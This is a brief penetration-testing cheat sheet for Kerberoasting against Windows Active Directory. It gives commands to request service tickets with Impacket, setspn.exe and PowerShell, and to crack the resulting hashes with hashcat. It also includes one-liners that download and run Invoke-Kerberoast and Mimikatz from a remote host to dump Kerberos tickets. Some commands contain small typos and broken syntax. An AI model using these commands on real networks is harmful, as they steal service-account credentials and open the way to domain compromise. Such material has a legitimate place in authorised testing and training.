# Kerberoast

## Performing the Attack
To begin make sure Port 88 is available (port forward if needed). Also make sure your time + timezone and the targets time are in sync, kerberos is very time sensitive. You can view the time on windows with `tzdate /g`.

### Get User SPNs:
First get SPNs with one of the following techniques:

Remote via Impacket:
`GetUserSPNs.py -request -dc-ip <ip> <domain>/<user>`

Local via setspn.exe:
```
Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
```

Local via Powershell:
```
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/<user>.<domain>"  
```

Local via PowerSploit:
```
powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://<ip>:<port>/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat Hashcat
```

The result of this step will be the hash of a kerberos ticket. It can directly be cracked with `hashcat64.exe -m 13100 roasted.hash <wordlist>`.

Whole Attack as oneliner:
powershell.exe -exec bypass IEX (New-Object) Net.WebClient).DownloadString('<url to MimiKatz.ps1>'); Invoke-Mimikatz -Command "kerberos::list /export"

tags: windows kerberos powershell Kerberoasting
